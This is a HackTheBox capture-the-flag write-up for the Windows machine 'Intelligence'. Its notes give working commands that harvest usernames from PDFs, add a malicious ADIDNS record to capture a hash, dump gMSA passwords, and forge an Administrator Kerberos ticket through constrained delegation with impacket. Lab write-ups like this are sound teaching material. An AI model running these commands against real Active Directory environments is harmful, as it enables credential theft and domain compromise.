---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/1JTeYTgqVUk/0.jpg
layout: post
media_subpath: /assets/posts/2021-11-27-password-spraying-gmsa-adidns-constrained-delegation-intelligence-hackthebox
tags:
- active directory
- constrained delegation
- dns
- gmsa
- hackthebox
- password spraying
- windows
title: Password Spraying, gMSA, ADIDNS & Constrained Delegation - Intelligence
  @ HackTheBox
---

We are solving intelligence, a nice Windows machine on HackTheBox, created by Micah. For user, we will enumerate pdfs on a webserver & will use both the content & metadata to find valid credentials of a domain user. For root, we update a DNS entry, steal a hash & dump a GMSA password. Finally, we will exploit constrained delegation with impacket to get an administrator ticket.

{% youtube 1JTeYTgqVUk %}

## Notes

**Handle PDFs:**

```
for d in $(seq -f "%02g" 1 31); do for m in $(seq -f "%02g" 1 12); do wget -nv http://intelligence.htb/documents/2020-$m-$d-upload.pdf 2>/dev/null; done; done

for f in *.pdf; do pdftotext $f - >> output.txt; done

for f in *.pdf; do exiftool $f | grep Creator | awk -F ': ' '{print $2}' >> users.txt; done
```

**Set DNS Entry:**

```
python3 dnstool.py -u 'INTELLIGENCE\Tiffany.Molina' -p '' -a add -r 'webxct' -d '10.10.14.13'  10.129.193.97
```

**Bloodhound:**

```
bloodhound-python -c all -u Ted.Graves -p '' -d intelligence.htb -dc dc.intelligence.htb -ns 10.129.193.97 --disable-pooling -w1 --dns-timeout 30
```

**Dump gMSA Passwords from Linux:**

```
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
```

**Constrained Delegation:**

```
impacket-getST -spn www/dc.intelligence.htb 'intelligence.htb/svc_int$' -hashes :''-impersonate Administrator -dc-ip 10.129.193.97 
```

**Links:**

<https://github.com/dirkjanm/krbrelayx>

<https://github.com/micahvandeusen/gMSADumper>